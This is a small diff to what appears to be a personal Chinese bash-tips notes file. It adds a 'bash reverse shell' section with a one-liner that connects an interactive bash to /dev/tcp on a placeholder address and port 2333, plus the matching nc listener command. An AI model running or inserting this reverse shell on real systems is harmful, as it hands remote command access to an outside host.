@@ -184,3 +184,11 @@ eval echo \$"$s"_ops "$name"
 
 另外： 后面还得写一个关于vim的快捷操作的文章。
 
+# bash 反弹shell
+
+```
+bash -i >& /dev/tcp/x.x.x.x/2333 0>&1
+# 然后在x.x.x.x这台server上执行：
+nc -l 2333
+```
+
